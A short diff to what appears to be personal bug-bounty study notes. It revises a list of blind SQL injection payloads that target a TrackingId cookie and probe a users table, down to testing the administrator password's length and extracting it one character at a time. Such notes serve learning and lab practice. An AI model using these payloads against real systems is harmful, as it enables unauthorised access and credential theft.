@@ -39,7 +39,7 @@ This is all about web &amp; bugbounty
      TrackingId=xyz' AND '1'='1
    ii)TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
    iii)'and (select 'a' from users where username ='administrator')='a'--
-   iV)'and (select 'a' from users where username ='administrator' AND            
-      LENGTH(password)>1)='a'--
+   iV)'and (select username from users where username ='administrator' AND            
+      LENGTH(password)>1)='administrator'--
    v)' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='q'--
 </pre>
